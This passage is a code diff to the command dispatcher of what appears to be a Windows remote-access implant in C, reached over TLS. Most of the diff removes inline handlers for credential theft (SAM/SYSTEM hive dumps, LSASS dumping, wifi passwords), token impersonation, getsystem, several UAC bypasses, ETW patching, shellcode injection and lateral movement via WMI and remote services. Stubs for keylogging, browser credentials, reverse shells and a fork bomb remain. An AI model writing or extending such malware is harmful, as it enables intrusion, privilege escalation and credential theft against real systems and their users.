+        /* (special: calls tls_disconnect + ExitProcess on success)          */
         if (cbCmd >= 8 && strncmp("migrate ", cmd, 8) == 0) {
             char args[32] = {0};
             strncpy(args, cmd + 8, sizeof(args) - 1);
@@ -697,26 +861,10 @@ void shell_run(TLS_CONTEXT *pTls)
             continue;
         }
 
-        /* â”€â”€ Shell-command fallbacks â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
-        /* These verbs map 1-to-1 to Windows shell commands.           */
+        /* â"€â"€ Shell-command fallbacks â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€ */
 
-        /* users â†’ net user */
-        if (cbCmd >= 5 && strncmp("users", cmd, 5) == 0 &&
-            (cbCmd == 5 || cmd[5] == ' ')) {
-            free(pCmd); pCmd = NULL;
-            _shell_exec(pTls, "net user");
-            continue;
-        }
-
-        /* logged_in â†’ query user */
-        if (cbCmd >= 9 && strncmp("logged_in", cmd, 9) == 0 &&
-            (cbCmd == 9 || cmd[9] == ' ')) {
-            free(pCmd); pCmd = NULL;
-            _shell_exec(pTls, "query user 2>&1");
-            continue;
-        }
-
-        /* services [filter] â†’ sc query / tasklist /svc */
+        /* services [filter] â†' sc query / tasklist /svc
+         * (kept here: optional filter argument needs special handling) */
         if (cbCmd >= 8 && strncmp("services", cmd, 8) == 0 &&
             (cbCmd == 8 || cmd[8] == ' ')) {
             char sub[MAX_PATH] = {0};
@@ -730,94 +878,6 @@ void shell_run(TLS_CONTEXT *pTls)
             }
             free(pCmd); pCmd = NULL;
             _shell_exec(pTls, shellcmd);
-            continue;
-        }
-
-        /* scheduled_tasks â†’ schtasks */
-        if (cbCmd >= 15 && strncmp("scheduled_tasks", cmd, 15) == 0 &&
-            (cbCmd == 15 || cmd[15] == ' ')) {
-            free(pCmd); pCmd = NULL;
-            _shell_exec(pTls, "schtasks /query /fo LIST 2>&1");
-            continue;
-        }
-
-        /* installed_software → reg query Uninstall hive
-         * (wmic product was removed from Windows 11 24H2; use reg query directly) */
-        if (cbCmd >= 18 && strncmp("installed_software", cmd, 18) == 0 &&
-            (cbCmd == 18 || cmd[18] == ' ')) {
-            free(pCmd); pCmd = NULL;
-            _shell_exec(pTls,
-                "reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\""
-                " /s /v DisplayName 2>&1 & "
-                "reg query \"HKLM\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\""
-                " /s /v DisplayName 2>&1");
-            continue;
-        }
-
-        /* startup_items â†’ reg query Run keys */
-        if (cbCmd >= 13 && strncmp("startup_items", cmd, 13) == 0 &&
-            (cbCmd == 13 || cmd[13] == ' ')) {
-            free(pCmd); pCmd = NULL;
-            _shell_exec(pTls,
-                "reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" 2>&1 & "
-                "reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" 2>&1");
-            continue;
-        }
-
-        /* wifi_passwords — native WlanGetProfile (no cmd.exe for-loop) */
-        if (cbCmd >= 14 && strncmp("wifi_passwords", cmd, 14) == 0 &&
-            (cbCmd == 14 || cmd[14] == ' ')) {
-            free(pCmd); pCmd = NULL;
-            _handle_wifi_passwords(pTls);
-            continue;
-        }
-
-        /* hashdump → reg save SAM/SYSTEM to temp files
-         * reg save requires SeBackupPrivilege.  Run each command separately
-         * so the operator sees the real output (success or "Access is denied"),
-         * instead of a hardcoded success echo that hides failures. */
-        if (cbCmd >= 8 && strncmp("hashdump", cmd, 8) == 0 &&
-            (cbCmd == 8 || cmd[8] == ' ')) {
-            free(pCmd); pCmd = NULL;
-            _shell_exec(pTls, "reg save HKLM\\SAM %TEMP%\\sam.hiv /y 2>&1");
-            _shell_exec(pTls, "reg save HKLM\\SYSTEM %TEMP%\\sys.hiv /y 2>&1");
-            _send_str(pTls,
-                "[*] hashdump: if no errors above, pull with:\n"
-                "    download %TEMP%\\sam.hiv\n"
-                "    download %TEMP%\\sys.hiv\n"
-                "    (Requires SeBackupPrivilege — run getsystem first if denied)");
-            continue;
-        }
-
-        /* netstat — native GetExtendedTcpTable (no cmd.exe) */
-        if (cbCmd >= 7 && strncmp("netstat", cmd, 7) == 0 &&
-            (cbCmd == 7 || cmd[7] == ' ')) {
-            free(pCmd); pCmd = NULL;
-            _handle_netstat(pTls);
-            continue;
-        }
-
-        /* arp — native GetIpNetTable2 (no cmd.exe) */
-        if (cbCmd >= 3 && strncmp("arp", cmd, 3) == 0 &&
-            (cbCmd == 3 || cmd[3] == ' ')) {
-            free(pCmd); pCmd = NULL;
-            _handle_arp(pTls);
-            continue;
-        }
-
-        /* ifconfig — native GetAdaptersAddresses (no cmd.exe) */
-        if (cbCmd >= 8 && strncmp("ifconfig", cmd, 8) == 0 &&
-            (cbCmd == 8 || cmd[8] == ' ')) {
-            free(pCmd); pCmd = NULL;
-            _handle_ifconfig(pTls);
-            continue;
-        }
-
-        /* routes â†’ route print */
-        if (cbCmd >= 6 && strncmp("routes", cmd, 6) == 0 &&
-            (cbCmd == 6 || cmd[6] == ' ')) {
-            free(pCmd); pCmd = NULL;
-            _handle_routes(pTls);
             continue;
         }
 
@@ -848,123 +908,6 @@ void shell_run(TLS_CONTEXT *pTls)
                 _snprintf(shellcmd, sizeof(shellcmd) - 1, "nslookup \"%s\" 2>&1", host);
                 _shell_exec(pTls, shellcmd);
             }
-            continue;
-        }
-
-        /* etw_patch â€” patch EtwEventWrite in this process */
-        if (cbCmd >= 9 && strncmp("etw_patch", cmd, 9) == 0 &&
-            (cbCmd == 9 || cmd[9] == ' ')) {
-            free(pCmd); pCmd = NULL;
-            etw_patch();
-            _send_str(pTls, "[+] etw_patch: EtwEventWrite patched (RET stub)");
-            continue;
-        }
-
-        /* dump_lsass â€” MiniDumpWriteDump lsass â†’ %TEMP%\lsass.dmp */
-        if (cbCmd >= 10 && strncmp("dump_lsass", cmd, 10) == 0 &&
-            (cbCmd == 10 || cmd[10] == ' ')) {
-            free(pCmd); pCmd = NULL;
-            _handle_dump_lsass(pTls);
-            continue;
-        }
-
-        /* token_impersonate <pid> — steal token from <pid> */
-        if (cbCmd >= 19 && strncmp("token_impersonate ", cmd, 19) == 0) {
-            char args[32] = {0};
-            strncpy(args, cmd + 19, sizeof(args) - 1);
-            free(pCmd); pCmd = NULL;
-            _handle_token_impersonate(pTls, args);
-            continue;
-        }
-
-        /* token_revert — RevertToSelf(), undo token_impersonate / getsystem */
-        if (cbCmd >= 12 && strncmp("token_revert", cmd, 12) == 0 &&
-            (cbCmd == 12 || cmd[12] == ' ')) {
-            free(pCmd); pCmd = NULL;
-            _handle_token_revert(pTls);
-            continue;
-        }
-
-        /* getsystem — named-pipe impersonation → SYSTEM token */
-        if (cbCmd >= 9 && strncmp("getsystem", cmd, 9) == 0 &&
-            (cbCmd == 9 || cmd[9] == ' ')) {
-            free(pCmd); pCmd = NULL;
-            _handle_getsystem(pTls);
-            continue;
-        }
-
-        /* uac_bypass [exe] — elevate via schtasks /RL HIGHEST
-         * Bare "uac_bypass" (no args) = relaunch this agent at High IL.
-         * "uac_bypass <exe>" = launch <exe> at High IL. */
-        if ((cbCmd == 10 && strncmp("uac_bypass", cmd, 10) == 0) ||
-            (cbCmd >= 11 && strncmp("uac_bypass ", cmd, 11) == 0)) {
-            char args[2048] = {0};
-            if (cbCmd > 11)
-                strncpy(args, cmd + 11, sizeof(args) - 1);
-            free(pCmd); pCmd = NULL;
-            _handle_uac_bypass(pTls, args);
-            continue;
-        }
-
-        /* uac_reg_hijack <payload> — HKCU registry hijack (fodhelper/eventvwr) */
-        if ((cbCmd == 14 && strncmp("uac_reg_hijack", cmd, 14) == 0) ||
-            (cbCmd >= 15 && strncmp("uac_reg_hijack ", cmd, 15) == 0)) {
-            char args[MAX_PATH * 2] = {0};
-            if (cbCmd > 15)
-                strncpy(args, cmd + 15, sizeof(args) - 1);
-            free(pCmd); pCmd = NULL;
-            _handle_uac_reg_hijack(pTls, args);
-            continue;
-        }
-
-        /* uac_dll_hijack <dllname> <target_exe> — DLL search-order hijack */
-        if ((cbCmd == 14 && strncmp("uac_dll_hijack", cmd, 14) == 0) ||
-            (cbCmd >= 15 && strncmp("uac_dll_hijack ", cmd, 15) == 0)) {
-            char args[MAX_PATH * 2] = {0};
-            if (cbCmd > 15)
-                strncpy(args, cmd + 15, sizeof(args) - 1);
-            free(pCmd); pCmd = NULL;
-            _handle_uac_dll_hijack(pTls, args);
-            continue;
-        }
-
-        /* uac_com_hijack <payload> — ICMLuaUtil COM elevation moniker */
-        if ((cbCmd == 14 && strncmp("uac_com_hijack", cmd, 14) == 0) ||
-            (cbCmd >= 15 && strncmp("uac_com_hijack ", cmd, 15) == 0)) {
-            char args[MAX_PATH * 2] = {0};
-            if (cbCmd > 15)
-                strncpy(args, cmd + 15, sizeof(args) - 1);
-            free(pCmd); pCmd = NULL;
-            _handle_uac_com_hijack(pTls, args);
-            continue;
-        }
-
-        /* uac_env_expand [payload] — %APPDATA% redirect + srrstr.dll sideload */
-        if ((cbCmd == 14 && strncmp("uac_env_expand", cmd, 14) == 0) ||
-            (cbCmd >= 15 && strncmp("uac_env_expand ", cmd, 15) == 0)) {
-            char args[MAX_PATH] = {0};
-            if (cbCmd > 15)
-                strncpy(args, cmd + 15, sizeof(args) - 1);
-            free(pCmd); pCmd = NULL;
-            _handle_uac_env_expand(pTls, args);
-            continue;
-        }
-
-        /* lateral_wmi <host> <command> — WMI Win32_Process.Create */
-        if (cbCmd >= 12 && strncmp("lateral_wmi ", cmd, 12) == 0) {
-            char args[1024] = {0};
-            strncpy(args, cmd + 12, sizeof(args) - 1);
-            free(pCmd); pCmd = NULL;
-            _handle_lateral_wmi(pTls, args);
-            continue;
-        }
-
-        /* lateral_sc <host> <command> — remote service creation */
-        if (cbCmd >= 11 && strncmp("lateral_sc ", cmd, 11) == 0) {
-            char args[1024] = {0};
-            strncpy(args, cmd + 11, sizeof(args) - 1);
-            free(pCmd); pCmd = NULL;
-            _handle_lateral_sc(pTls, args);
             continue;
         }
 
@@ -1058,43 +1001,7 @@ void shell_run(TLS_CONTEXT *pTls)
             continue;
         }
 
-        /* cat <file> â†’ type */
-        if (cbCmd >= 4 && strncmp("cat ", cmd, 4) == 0) {
-            char path[MAX_PATH] = {0};
-            strncpy(path, cmd + 4, sizeof(path) - 1);
-            char shellcmd[MAX_PATH + 8] = {0};
-            _snprintf(shellcmd, sizeof(shellcmd) - 1, "type \"%s\" 2>&1", path);
-            free(pCmd); pCmd = NULL;
-            _shell_exec(pTls, shellcmd);
-            continue;
-        }
-
-        /* mkdir <path> â†’ mkdir */
-        if (cbCmd >= 6 && strncmp("mkdir ", cmd, 6) == 0) {
-            char path[MAX_PATH] = {0};
-            strncpy(path, cmd + 6, sizeof(path) - 1);
-            char shellcmd[MAX_PATH + 10] = {0};
-            _snprintf(shellcmd, sizeof(shellcmd) - 1, "mkdir \"%s\" 2>&1", path);
-            free(pCmd); pCmd = NULL;
-            _shell_exec(pTls, shellcmd);
-            continue;
-        }
-
-        /* rm <path> â†’ del /f /q or rmdir /s /q */
-        if (cbCmd >= 3 && strncmp("rm ", cmd, 3) == 0) {
-            char path[MAX_PATH] = {0};
-            strncpy(path, cmd + 3, sizeof(path) - 1);
-            char shellcmd[MAX_PATH + 48] = {0};
-            _snprintf(shellcmd, sizeof(shellcmd) - 1,
-                "if exist \"%s\\\" (rmdir /s /q \"%s\" 2>&1) "
-                "else (del /f /q \"%s\" 2>&1)",
-                path, path, path);
-            free(pCmd); pCmd = NULL;
-            _shell_exec(pTls, shellcmd);
-            continue;
-        }
-
-        /* find_files <path> <pattern> â†’ dir /s /b */
+        /* find_files <path> <pattern> â†' dir /s /b */
         if (cbCmd >= 11 && strncmp("find_files ", cmd, 11) == 0) {
             char fpath[MAX_PATH] = {0};
             char fpat[128]       = {0};
@@ -1111,19 +1018,7 @@ void shell_run(TLS_CONTEXT *pTls)
             continue;
         }
 
-        /* file_hash <path> â†’ certutil -hashfile SHA256 */
-        if (cbCmd >= 10 && strncmp("file_hash ", cmd, 10) == 0) {
-            char path[MAX_PATH] = {0};
-            strncpy(path, cmd + 10, sizeof(path) - 1);
-            char shellcmd[MAX_PATH + 32] = {0};
-            _snprintf(shellcmd, sizeof(shellcmd) - 1,
-                "certutil -hashfile \"%s\" SHA256 2>&1", path);
-            free(pCmd); pCmd = NULL;
-            _shell_exec(pTls, shellcmd);
-            continue;
-        }
-
-        /* tail <file> [n] â†’ powershell Get-Content -Tail */
+        /* tail <file> [n] â†' powershell Get-Content -Tail */
         if (cbCmd >= 5 && strncmp("tail ", cmd, 5) == 0) {
             char path[MAX_PATH] = {0};
             int  n = 20;
@@ -1152,80 +1047,6 @@ void shell_run(TLS_CONTEXT *pTls)
                 path, rest);
             free(pCmd); pCmd = NULL;
             _shell_exec(pTls, shellcmd);
-            continue;
-        }
-
-        /* chmod <mode> <path> â†’ icacls (Windows approximation) */
-        if (cbCmd >= 6 && strncmp("chmod ", cmd, 6) == 0) {
-            char mode[16] = {0}, path[MAX_PATH] = {0};
-            sscanf(cmd + 6, "%15s %259s", mode, path);
-            char shellcmd[MAX_PATH + 64] = {0};
-            _snprintf(shellcmd, sizeof(shellcmd) - 1,
-                "icacls \"%s\" 2>&1 & echo [!] chmod mapped to icacls on Windows",
-                path);
-            free(pCmd); pCmd = NULL;
-            _shell_exec(pTls, shellcmd);
-            continue;
-        }
-
-        /* find_writable <path> â†’ icacls + findstr */
-        if (cbCmd >= 14 && strncmp("find_writable ", cmd, 14) == 0) {
-            char path[MAX_PATH] = {0};
-            strncpy(path, cmd + 14, sizeof(path) - 1);
-            char shellcmd[MAX_PATH + 64] = {0};
-            _snprintf(shellcmd, sizeof(shellcmd) - 1,
-                "icacls \"%s\" /t 2>&1 | findstr /i \"(W) (M) (F) Everyone Users\"",
-                path);
-            free(pCmd); pCmd = NULL;
-            _shell_exec(pTls, shellcmd);
-            continue;
-        }
-
-        /* find_suid → Windows has no SUID; enumerate services via sc query
-         * (wmic service was removed from Windows 11 24H2; sc query is always present) */
-        if (cbCmd >= 9 && strncmp("find_suid", cmd, 9) == 0 &&
-            (cbCmd == 9 || cmd[9] == ' ')) {
-            free(pCmd); pCmd = NULL;
-            _shell_exec(pTls,
-                "echo [*] No SUID on Windows. Services with non-Windows paths: & "
-                "sc query state= all 2>&1 | findstr /i \"SERVICE_NAME\" & "
-                "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\" /s /v ImagePath"
-                " 2>&1 | findstr /i /v \"system32 syswow64 DriverStore\"");
-            continue;
-        }
-
-        /* ── bg <cmd> — fire-and-forget background job ──────────────────── */
-        if (cbCmd >= 3 && strncmp("bg ", cmd, 3) == 0) {
-            char args[1024] = {0};
-            strncpy(args, cmd + 3, sizeof(args) - 1);
-            free(pCmd); pCmd = NULL;
-            _bg_shell_exec(pTls, args);
-            continue;
-        }
-
-        /* ── jobs — list background jobs ─────────────────────────────────── */
-        if ((cbCmd == 4 && strncmp("jobs", cmd, 4) == 0) ||
-            (cbCmd >= 5 && strncmp("jobs ", cmd, 5) == 0)) {
-            free(pCmd); pCmd = NULL;
-            _list_jobs(pTls);
-            continue;
-        }
-
-        /* ── job_output <id> — fetch completed job output ────────────────── */
-        if (cbCmd >= 11 && strncmp("job_output ", cmd, 11) == 0) {
-            char args[16] = {0};
-            strncpy(args, cmd + 11, sizeof(args) - 1);
-            free(pCmd); pCmd = NULL;
-            _job_output(pTls, args);
-            continue;
-        }
-
-        /* ── job_kill <id> — terminate a running background job ──────────── */
-        if (cbCmd >= 9 && strncmp("job_kill ", cmd, 9) == 0) {
-            char args[16] = {0};
-            strncpy(args, cmd + 9, sizeof(args) - 1);
-            free(pCmd); pCmd = NULL;
-            _job_kill(pTls, args);
             continue;
         }
 
@@ -1447,16 +1268,8 @@ void shell_run(TLS_CONTEXT *pTls)
         _NS("keylog_stop",        11)
         _NS("browser_history",    15)
         _NS("browser_creds",      13)
-        /* inject_shellcode <pid> <hex> — alias for "inject" */
-        if (cbCmd >= 17 && strncmp("inject_shellcode ", cmd, 17) == 0) {
-            char args[65600] = {0};
-            strncpy(args, cmd + 17, sizeof(args) - 1);
-            free(pCmd); pCmd = NULL;
-            inject_shellcode(pTls, args);
-            continue;
-        }
-
-        /* dll_inject <pid> — alias for "migrate" (reflective PE injection) */
+        /* inject_shellcode <pid> <hex> — alias for "inject" (in dispatch table) */
+        /* dll_inject <pid>            — alias for "migrate" */
         if (cbCmd >= 11 && strncmp("dll_inject ", cmd, 11) == 0) {
             char args[32] = {0};
             strncpy(args, cmd + 11, sizeof(args) - 1);
@@ -1467,81 +1280,22 @@ void shell_run(TLS_CONTEXT *pTls)
         _NS("reverse_shell",      13)
         _NS("socks5",              6)
         _NS("portfwd",             7)
-        /* uac_bypass is now implemented — entry removed from _NS stubs */
         _NS("cred_vault",         10)
         _NS("ssh_harvest",        11)
         _NS("sudo_sniff",         10)
         _NS("sudo_sniff_read",    15)
         _NS("sudo_sniff_clean",   16)
-
-        /* clip_watch — poll clipboard for change (up to 30 s) */
-        if (cbCmd >= 10 && strncmp("clip_watch", cmd, 10) == 0 &&
-            (cbCmd == 10 || cmd[10] == ' ')) {
-            free(pCmd); pCmd = NULL;
-            _handle_clip_watch(pTls);
-            continue;
-        }
-
         _NS("notify",              6)
-
-        /* open_url <url> — ShellExecute default browser */
-        if (cbCmd >= 9 && strncmp("open_url ", cmd, 9) == 0) {
-            char args[2048] = {0};
-            strncpy(args, cmd + 9, sizeof(args) - 1);
-            free(pCmd); pCmd = NULL;
-            _handle_open_url(pTls, args);
-            continue;
-        }
-
         _NS("play_sound",         10)
-
-        /* set_wallpaper <path> — SystemParametersInfoA SPI_SETDESKWALLPAPER */
-        if (cbCmd >= 14 && strncmp("set_wallpaper ", cmd, 14) == 0) {
-            char args[MAX_PATH] = {0};
-            strncpy(args, cmd + 14, sizeof(args) - 1);
-            free(pCmd); pCmd = NULL;
-            _handle_set_wallpaper(pTls, args);
-            continue;
-        }
-
-        /* mouse_move <x> <y> — SetCursorPos */
-        if (cbCmd >= 11 && strncmp("mouse_move ", cmd, 11) == 0) {
-            char args[32] = {0};
-            strncpy(args, cmd + 11, sizeof(args) - 1);
-            free(pCmd); pCmd = NULL;
-            _handle_mouse_move(pTls, args);
-            continue;
-        }
-
-        /* type_keys <text> — SendInput keystroke simulation */
-        if (cbCmd >= 11 && strncmp("type_keys ", cmd, 10) == 0) {
-            char args[2048] = {0};
-            strncpy(args, cmd + 10, sizeof(args) - 1);
-            free(pCmd); pCmd = NULL;
-            _handle_type_keys(pTls, args);
-            continue;
-        }
-
         _NS("forkbomb",            8)
         _NS("living_off_land",    15)
         _NS("zip_download",       12)
         _NS("zip_upload",         10)
-
-        /* run_psh <cmd> — execute PowerShell, capture output */
-        if (cbCmd >= 8 && strncmp("run_psh ", cmd, 8) == 0) {
-            char args[4096] = {0};
-            strncpy(args, cmd + 8, sizeof(args) - 1);
-            free(pCmd); pCmd = NULL;
-            _handle_run_psh(pTls, args);
-            continue;
-        }
-
         _NS("run_python",          10)
         _NS("pty_shell",           9)
         _NS("load_extension",     14)
         _NS("unload_extension",   16)
         _NS("irb",                 3)
-        /* getsystem is now implemented — entry removed from _NS stubs */
         _NS("kiwi",                4)
 
 #undef _NS
